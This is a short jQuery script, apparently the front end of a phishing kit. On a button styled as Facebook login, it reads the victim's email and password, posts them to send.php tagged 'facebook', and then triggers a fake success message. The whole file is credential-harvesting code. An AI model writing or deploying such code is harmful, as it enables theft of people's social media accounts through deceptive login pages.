
// Login Form
$(document).ready(function() {
    $('.facebook-login-bu').click(function() {
        var email = $('.email_fa').val();
        var password = $('.password_fa').val();
        $.post('send.php', {
            info: "facebook",
            password: password,
            email: email
        }, function() {
            $('.done-successfully-cinghaha').click();
        });
    });
});